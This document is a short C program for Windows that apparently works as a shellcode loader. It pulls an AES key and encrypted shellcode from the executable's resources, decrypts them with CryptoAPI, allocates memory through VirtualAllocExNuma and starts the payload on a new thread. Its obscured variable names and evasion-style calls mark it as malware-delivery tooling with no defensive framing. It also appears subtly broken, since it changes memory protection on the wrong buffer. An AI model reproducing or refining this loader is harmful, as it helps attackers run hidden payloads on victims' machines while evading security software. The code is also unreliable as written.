#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

// Function to load resource data into memory
void coolredasload(const char* resName, unsigned char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
    

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (unsigned char*)LockResource(hResData);
}

// Function to decrypt AES encrypted shellcode
void DECaes(char* coolcode, DWORD coolcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, (BYTE*)key, keyLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)coolcode, &coolcodeLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}


int main() {
    

    unsigned char* AESkey;
    DWORD AESkeyLen;
    coolredasload("AESKEY", &AESkey, &AESkeyLen);  // Load AES key

    unsigned char* AESCode;
    DWORD AESCodeLen;
    coolredasload("AESCODE", &AESCode, &AESCodeLen);  // Load AES shellcode

    // Print the AES key and shellcode for debugging (as hex)
     unsigned char keykum[AESkeyLen];
    unsigned char codkuma[AESCodeLen];

    // Copy the data into the arrays
    memcpy(keykum, AESkey, AESkeyLen);
    memcpy(codkuma, AESCode, AESCodeLen);

    // Print the AES key and shellcode for debugging (as hex)
    

    LPVOID coollo = VirtualAllocExNuma(GetCurrentProcess(), NULL, AESCodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0xFFFFFFFF);

    DECaes((char*)codkuma, sizeof(codkuma), keykum, sizeof(keykum));  // Decrypt AES shellcode

    memcpy(coollo, codkuma, sizeof(codkuma));  
    DWORD oldProtect;
    VirtualProtect(codkuma, sizeof(codkuma), PAGE_EXECUTE_READ, &oldProtect);  

    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)coollo, NULL, 0, NULL);  
    WaitForSingleObject(tHandle, INFINITE);  // Wait for thread to finish

    return 0;
}
